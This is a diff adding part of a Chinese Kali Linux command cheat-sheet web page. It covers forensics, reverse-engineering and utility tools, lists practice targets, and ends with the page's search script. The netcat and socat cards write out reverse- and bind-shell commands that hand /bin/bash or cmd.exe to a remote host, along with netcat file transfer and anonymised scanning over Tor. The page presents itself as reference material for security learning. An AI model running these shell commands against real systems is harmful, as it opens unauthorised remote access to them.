+          <div class="code-block">
+<span class="cp"># 列出分区</span>
+$ <span class="c0">mmls</span> disk.img
+
+<span class="cp"># 列出删除的文件</span>
+$ <span class="c0">fls -rd</span> disk.img
+
+<span class="cp"># 按 inode 恢复文件</span>
+$ <span class="c0">icat</span> disk.img 12345 &gt; recovered_file.txt
+          </div>
+        </div>
+      </article>
+    </div>
+  </section>
+
+  <!-- ===================== 逆向工程 ===================== -->
+  <section class="category-section" data-cat="rev">
+    <div class="cat-header">
+      <span style="font-size:22px">🔧</span>
+      <h2 style="color:var(--accent5)">逆向工程</h2>
+      <span class="badge">5 条</span>
+    </div>
+    <div class="cmd-grid">
+
+      <article class="cmd-card" data-command="gdb">
+        <div class="cmd-row">
+          <span class="cmd-name">gdb</span>
+          <span class="cmd-tag tag-rev">调试</span>
+        </div>
+        <div class="cmd-desc">GNU 调试器 —— 分析可执行文件的运行时行为</div>
+        <div class="cmd-detail">
+          <div class="detail-label">📖 语法</div>
+          <div class="code-block"><span class="c0">gdb</span> 程序</div>
+          <div class="detail-label">🔧 常用命令</div>
+          <div class="code-block">
+<span class="c2">disas main</span>         反汇编 main 函数
+<span class="c2">break main</span>         在 main 设断点
+<span class="c2">run</span>                运行程序
+<span class="c2">stepi</span>              单步执行（一条指令）
+<span class="c2">info registers</span>     查看寄存器
+<span class="c2">x/10gx $rsp</span>        查看栈内存
+          </div>
+          <div class="tip-box"><span class="ti">💡</span><span><strong>pwndbg</strong> / <strong>gef</strong> / <strong>peda</strong> 是 gdb 的增强插件，Kali 预装 <strong>pwndbg</strong> 默认加载。</span></div>
+        </div>
+      </article>
+
+      <article class="cmd-card" data-command="radare2">
+        <div class="cmd-row">
+          <span class="cmd-name">radare2</span>
+          <span class="cmd-tag tag-rev">反汇编</span>
+        </div>
+        <div class="cmd-desc">开源的逆向工程框架（反汇编、调试、补丁）</div>
+        <div class="cmd-detail">
+          <div class="detail-label">📖 使用</div>
+          <div class="code-block">
+<span class="cp"># 打开文件</span>
+$ <span class="c0">r2</span> ./binary
+
+<span class="cm">[0x100004d8]&gt; </span><span class="c2">aaa</span>          <span class="cm"># 全自动分析</span>
+<span class="cm">[0x100004d8]&gt; </span><span class="c2">afl</span>          <span class="cm"># 列出所有函数</span>
+<span class="cm">[0x100004d8]&gt; </span><span class="c2">VV</span>           <span class="cm"># 图形化反汇编</span>
+<span class="cm">[0x100004d8]&gt; </span><span class="c2">iz</span>           <span class="cm"># 列出字符串</span>
+<span class="cm">[0x100004d8]&gt; </span><span class="c2">s main</span>       <span class="cm"># 跳到 main 函数</span>
+<span class="cm">[0x100004d8]&gt; </span><span class="c2">pdf</span>          <span class="cm"># 反汇编当前函数</span>
+          </div>
+          <div class="tip-box"><span class="ti">💡</span><span>r2 的命令体系比较特别但非常强大。<strong>cutter</strong> 是基于 r2 的图形化版本。</span></div>
+        </div>
+      </article>
+
+      <article class="cmd-card" data-command="cutter">
+        <div class="cmd-row">
+          <span class="cmd-name">cutter</span>
+          <span class="cmd-tag tag-rev">GUI</span>
+        </div>
+        <div class="cmd-desc">radare2 的图形化界面（类似 IDA Pro 的免费替代）</div>
+        <div class="cmd-detail">
+          <div class="detail-label">📖 启动</div>
+          <div class="code-block">
+<span class="cp"># Kali 启动</span>
+$ <span class="c0">cutter</span>
+
+<span class="cm"># 打开文件后自动分析，图形化反汇编、十六进制编辑、函数列表...</span>
+          </div>
+        </div>
+      </article>
+
+      <article class="cmd-card" data-command="objdump">
+        <div class="cmd-row">
+          <span class="cmd-name">objdump</span>
+          <span class="cmd-tag tag-rev">二进制</span>
+        </div>
+        <div class="cmd-desc">显示目标文件信息（反汇编、节区、符号表）</div>
+        <div class="cmd-detail">
+          <div class="detail-label">📖 语法</div>
+          <div class="code-block"><span class="c0">objdump</span> [选项] 文件</div>
+          <div class="detail-label">💡 示例</div>
+          <div class="code-block">
+<span class="cp"># 反汇编代码段</span>
+$ <span class="c0">objdump -d</span> binary.elf
+
+<span class="cp"># 显示符号表</span>
+$ <span class="c0">objdump -t</span> binary.elf
+
+<span class="cp"># 显示所有节区信息</span>
+$ <span class="c0">objdump -x</span> binary.elf
+          </div>
+          <div class="tip-box"><span class="ti">💡</span><span>最简单的逆向工具！不需要额外安装。<strong>objdump -d</strong> 快速看汇编。</span></div>
+        </div>
+      </article>
+
+      <article class="cmd-card" data-command="strace">
+        <div class="cmd-row">
+          <span class="cmd-name">strace / ltrace</span>
+          <span class="cmd-tag tag-rev">跟踪</span>
+        </div>
+        <div class="cmd-desc">跟踪系统调用 / 库函数调用</div>
+        <div class="cmd-detail">
+          <div class="detail-label">📖 语法</div>
+          <div class="code-block">
+<span class="c0">strace</span> 程序     <span class="cm"># 跟踪系统调用</span>
+<span class="c0">ltrace</span> 程序     <span class="cm"># 跟踪库函数调用</span>
+          </div>
+          <div class="detail-label">💡 示例</div>
+          <div class="code-block">
+<span class="cp"># 看程序打开了哪些文件</span>
+$ <span class="c0">strace -e openat,read</span> ./program
+
+<span class="cp"># 保存跟踪日志</span>
+$ <span class="c0">strace -o</span> trace.log ./program
+          </div>
+          <div class="tip-box"><span class="ti">💡</span><span>不用反汇编就能看程序行为！<strong>strace</strong> 看系统调用（文件、网络），<strong>ltrace</strong> 看库函数。</span></div>
+        </div>
+      </article>
+    </div>
+  </section>
+
+  <!-- ===================== 实用工具 ===================== -->
+  <section class="category-section" data-cat="util">
+    <div class="cat-header">
+      <span style="font-size:22px">🧰</span>
+      <h2 style="color:var(--accent3)">实用工具</h2>
+      <span class="badge">6 条</span>
+    </div>
+    <div class="cmd-grid">
+
+      <article class="cmd-card" data-command="netcat">
+        <div class="cmd-row">
+          <span class="cmd-name">netcat (nc)</span>
+          <span class="cmd-tag tag-util">网络</span>
+        </div>
+        <div class="cmd-desc">TCP/IP 瑞士军刀 —— 端口扫描、反弹 Shell、文件传输</div>
+        <div class="cmd-detail">
+          <div class="detail-label">📖 语法</div>
+          <div class="code-block"><span class="c0">nc</span> [选项] 主机 端口</div>
+          <div class="detail-label">💡 示例</div>
+          <div class="code-block">
+<span class="cp"># 监听端口（充当简易服务器）</span>
+$ <span class="c0">nc -lvnp</span> 4444
+
+<span class="cp"># 反弹 Shell（目标机上执行）</span>
+$ <span class="c0">nc -e /bin/bash</span> 你的IP 4444   <span class="cm"># Linux</span>
+$ <span class="c0">nc.exe -e cmd.exe</span> 你的IP 4444 <span class="cm"># Windows</span>
+
+<span class="cp"># 端口扫描</span>
+$ <span class="c0">nc -zv</span> 192.168.1.1 22-100
+
+<span class="cp"># 文件传输（接收方）</span>
+$ <span class="c0">nc -lvnp</span> 4444 &gt; received.zip
+<span class="cm"># 文件传输（发送方）</span>
+$ <span class="c0">nc -w 3</span> 接收IP 4444 &lt; file.zip
+          </div>
+          <div class="tip-box"><span class="ti">💡</span><span>nc 最经典用法：反弹 Shell 和文件传输。<br>Kali 也预装 <strong>ncat</strong>（nmap 项目增强版），支持 SSL 加密传输。</span></div>
+        </div>
+      </article>
+
+      <article class="cmd-card" data-command="socat">
+        <div class="cmd-row">
+          <span class="cmd-name">socat</span>
+          <span class="cmd-tag tag-util">隧道</span>
+        </div>
+        <div class="cmd-desc">netcat 的增强版 —— 双向数据传输、端口转发、加密</div>
+        <div class="cmd-detail">
+          <div class="detail-label">💡 示例</div>
+          <div class="code-block">
+<span class="cp"># 反弹 Shell（比 nc 更稳定）</span>
+$ <span class="c0">socat TCP-LISTEN:4444,fork,reuseaddr EXEC:/bin/bash,pty,stderr
+
+<span class="cp"># 端口转发</span>
+$ <span class="c0">socat TCP-LISTEN:8080,fork TCP:192.168.1.100:80
+
+<span class="cp"># 加密连接（需 OpenSSL）</span>
+$ <span class="c0">socat OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork TCP:localhost:80
+          </div>
+        </div>
+      </article>
+
+      <article class="cmd-card" data-command="proxychains">
+        <div class="cmd-row">
+          <span class="cmd-name">proxychains</span>
+          <span class="cmd-tag tag-util">代理</span>
+        </div>
+        <div class="cmd-desc">强制任意程序使用代理（Tor / HTTP / SOCKS）</div>
+        <div class="cmd-detail">
+          <div class="detail-label">📖 语法</div>
+          <div class="code-block"><span class="c0">proxychains</span> 命令 [参数]</div>
+          <div class="detail-label">💡 示例</div>
+          <div class="code-block">
+<span class="cp"># 通过 Tor 使用 nmap 扫描（匿名扫描）</span>
+$ <span class="c0">proxychains nmap -sT -Pn target.com</span>
+
+<span class="cp"># 通过代理使用 curl</span>
+$ <span class="c0">proxychains curl https://check.torproject.org</span>
+
+<span class="cp"># 配置（/etc/proxychains.conf）</span>
+socks4 127.0.0.1 9050   <span class="cm"># Tor 默认端口</span>
+          </div>
+          <div class="tip-box"><span class="ti">💡</span><span>先启动 <strong>sudo systemctl start tor</strong>，然后 proxychains 就自动走 Tor 了！<br>注意：部分程序（如浏览器 DNS 泄漏）需要额外配置。</span></div>
+        </div>
+      </article>
+
+      <article class="cmd-card" data-command="metasploitable">
+        <div class="cmd-row">
+          <span class="cmd-name">🏴‍☠️ 靶场推荐</span>
+          <span class="cmd-tag tag-util">练习</span>
+        </div>
+        <div class="cmd-desc">练习 Kali 技能的靶场和资源</div>
+        <div class="cmd-detail">
+          <div class="detail-label">🎯 推荐靶场</div>
+          <div class="code-block">
+<span class="c2">Metasploitable 2/3</span>  官方靶机，内置大量漏洞
+<span class="c2">DVWA</span>                PHP 漏洞训练
+<span class="c2">VulnHub</span>             各类虚拟机靶场
+<span class="c2">HackTheBox</span>          在线渗透测试平台
+<span class="c2">TryHackMe</span>           新手友好，有教学引导
+<span class="c2">OverTheWire</span>         Linux 指令闯关游戏
+          </div>
+          <div class="tip-box"><span class="ti">💡</span><span>Kali 安装到 VMware/VirtualBox 后，用 <strong>Metasploitable 2</strong> 作为靶机练习 —— 扫描→漏洞发现→利用→提权的一条龙体验。</span></div>
+        </div>
+      </article>
+
+      <article class="cmd-card" data-command="maltego">
+        <div class="cmd-row">
+          <span class="cmd-name">maltego</span>
+          <span class="cmd-tag tag-util">情报</span>
+        </div>
+        <div class="cmd-desc">开源情报（OSINT）关联分析工具（图形化）</div>
+        <div class="cmd-detail">
+          <div class="detail-label">📖 启动</div>
+          <div class="code-block">
+$ <span class="c0">maltego</span>
+<span class="cm"># 社区版免费，需注册账号后使用</span>
+          </div>
+          <div class="tip-box"><span class="ti">💡</span><span>把域名、邮箱、社交账号"拉"到画布上，maltego 会自动发现它们之间的关联！</span></div>
+        </div>
+      </article>
+
+      <article class="cmd-card" data-command="exiftool">
+        <div class="cmd-row">
+          <span class="cmd-name">exiftool</span>
+          <span class="cmd-tag tag-util">元数据</span>
+        </div>
+        <div class="cmd-desc">读取/编辑/写入文件元数据（照片、文档）</div>
+        <div class="cmd-detail">
+          <div class="detail-label">📖 语法</div>
+          <div class="code-block"><span class="c0">exiftool</span> 文件</div>
+          <div class="detail-label">💡 示例</div>
+          <div class="code-block">
+<span class="cp"># 查看所有元数据</span>
+$ <span class="c0">exiftool</span> photo.jpg
+<span class="cs">&lt; 相机型号、GPS 坐标、拍摄时间、软件信息... &gt;</span>
+
+<span class="cp"># 删除所有敏感元数据</span>
+$ <span class="c0">exiftool -all=</span> photo.jpg
+          </div>
+          <div class="tip-box"><span class="ti">💡</span><span>安全提醒：发照片前记得清除 GPS 信息！<strong>exiftool -all= *.jpg</strong> 一键清空。</span></div>
+        </div>
+      </article>
+    </div>
+  </section>
+
+  <!-- ===== NO RESULTS ===== -->
+  <div class="no-match" id="noMatch">
+    <div class="nm-icon">🔍</div>
+    <p>没有找到匹配的指令</p>
+    <p style="font-size:13px;color:var(--text-muted);">试试其他关键词？</p>
+  </div>
+</main>
+
+<div class="toast" id="toast"></div>
+
+<footer>
+  ☠️ Kali Linux 指令速查手册 · 仅供安全学习与授权测试使用<br>
+  <span style="font-size:12px;">未经授权对目标系统进行测试是违法的</span>
+</footer>
+
+<script>
+(function(){
+  // Nav tabs
+  const tabs = document.querySelectorAll('.nav-btn');
+  const sections = document.querySelectorAll('.category-section');
+  const noMatch = document.getElementById('noMatch');
+
+  function showCategory(cat) {
+    let hasAny = false;
+    sections.forEach(s => {
+      if (cat === 'all' || s.dataset.cat === cat) {
+        s.classList.add('active');
+        hasAny = true;
+      } else {
+        s.classList.remove('active');
+      }
+    });
+    return hasAny;
+  }
+
+  tabs.forEach(tab => {
+    tab.addEventListener('click', () => {
+      tabs.forEach(t => t.classList.remove('active'));
+      tab.classList.add('active');
+      showCategory(tab.dataset.cat);
+      doSearch(searchInp.value);
+    });
+  });
+
+  // Search
+  const searchInp = document.getElementById('searchInp');
+  function doSearch(q) {
+    const query = q.trim().toLowerCase();
+    const activeSections = document.querySelectorAll('.category-section.active');
+    let foundAny = false;
+
+    activeSections.forEach(sec => {
+      const cards = sec.querySelectorAll('.cmd-card');
+      let secMatch = false;
+      cards.forEach(card => {
+        const name = card.dataset.command || '';
+        const desc = (card.querySelector('.cmd-desc')?.textContent || '') + (card.querySelector('.cmd-detail')?.textContent || '');
+        const full = name + ' ' + desc;
+        if (!query || full.toLowerCase().includes(query)) {
+          card.style.display = '';
+          secMatch = true;
+          foundAny = true;
+        } else {
+          card.style.display = 'none';
+        }
+      });
+      sec.style.display = (query && !secMatch) ? 'none' : '';
+    });
+
+    // Show no-match only when all sections are hidden
+    const anyVisible = [...document.querySelectorAll('.category-section.active')].some(s => s.style.display !== 'none');
+    noMatch.classList.toggle('show', !anyVisible && !!query);
+  }
+
+  searchInp.addEventListener('input', () => doSearch(searchInp.value));
+
+  // Card toggle
+  document.addEventListener('click', e => {
+    const card = e.target.closest('.cmd-card');
+    if (!card) return;
+    card.classList.toggle('open');
+  });
+
+  // Keyboard
+  document.addEventListener('keydown', e => {
+    if ((e.ctrlKey || e.metaKey) && e.key === 'f') {
+      e.preventDefault();
+      searchInp.focus();
+      searchInp.select();
+    }
+  });
+
+  // Toast
+  // (copy not needed for Kali cmd page but keeping functional)
+  console.log('☠️ Kali Linux 指令手册已加载！');
+  console.log('按 Ctrl+F 搜索 · 点击卡片展开详情 · 未经授权扫描违法！');
+})();
+</script>
+</body>
+</html>
